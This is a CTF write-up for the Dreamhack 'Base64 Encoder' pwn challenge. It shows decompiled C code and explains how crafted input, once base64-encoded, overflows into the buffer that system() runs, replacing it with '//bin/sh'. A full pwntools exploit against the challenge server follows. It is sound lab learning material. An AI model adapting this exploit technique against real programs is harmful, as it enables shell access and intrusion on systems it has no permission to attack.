+++
date = '2026-05-04'
draft = false
title = 'Dreamhack Base64 Encoder Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++

## Challenge overview

Simple Base64 Encoder

---

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v4; // [rsp+Ch] [rbp-B4h] BYREF
  char buf[64]; // [rsp+10h] [rbp-B0h] BYREF
  char dest[64]; // [rsp+50h] [rbp-70h] BYREF
  char command[10]; // [rsp+90h] [rbp-30h] BYREF
  __int16 v8; // [rsp+9Ah] [rbp-26h]
  int v9; // [rsp+9Ch] [rbp-24h]
  __int64 v10; // [rsp+A0h] [rbp-20h]
  __int64 v11; // [rsp+A8h] [rbp-18h]
  char *src; // [rsp+B0h] [rbp-10h]
  int bytes_read; // [rsp+BCh] [rbp-4h]

  strcpy(command, "echo bye");
  command[9] = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  sub_14A9();
  while ( 1 )
  {
    puts("[1] Base64 Encode");
    puts("[2] Exit");
    printf("> ");
    __isoc99_scanf("%d", &v4);
    if ( v4 != 1 )
      break;
    bytes_read = read(0, buf, 64u);
    src = (char *)bruh(buf, bytes_read);
    strcpy(dest, src);
    puts(dest);
    free(src);
  }
  if ( v4 != 2 )
  {
    puts("Invalid input");
    exit(-1);
  }
  system(command);
  return 0;
}
```

## Identifying the vulnerabilities

Looking at this, the base64 function will return a longer string than the input, right?

![challenge-screenshot](proof.png#center)

That means that the converted base64, when long enough, will overwrite the command. Let's see exactly how long it has to be.

To have the b64 encoded text be what we want it to be, I made the following python script:

```python
string = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'
encoded = string.encode('utf-8')
decoded = base64.b64decode(encoded)
print(decoded)
back = base64.b64encode(decoded)
print(back)
```
![challenge-screenshot](confirm.png#center)

Basically, `decoded`, once base64-ed will become what we input inside the string. Now that it's confirmed, we can make a function out of it.

Only thing to mind is that b64 is either a multiple of 4 or padded. And we don't want to complicate stuff with padding, right?

![challenge-screenshot](bingo.png#center)

This shows that we need to pad up to the last 'P', then we start overwriting command. Well, I replaced that with '//bin/sh' but we get `sh: 1: //bin/shCg==: not found`... looks like our newline gets converted as well. So let's send the output with `send` not `sendline`.

![challenge-screenshot](wurk.png#center)

And remotely, the flag:

![challenge-screenshot](flag.png#center)

![challenge-screenshot](source.gif#center)

## The exploit

```python
from pwn import *
import base64
elf = ELF('/home/kali/Downloads/dreamhack/base64/deploy/chall')
p=elf.process()

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:13333'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

#sa vdm ce facem cu aia 64 bytes

def b64specific(string):
    encoded = string.encode('utf-8')
    decoded = base64.b64decode(encoded)
    return decoded

def sendb64(bytez):
    p.recvuntil(b"> ")
    p.sendline(b'1') 
    p.send(bytez)

test = b64specific('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP//bin/sh')
sendb64(test)
#gdb.attach(p)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/base64encoder.py)**.
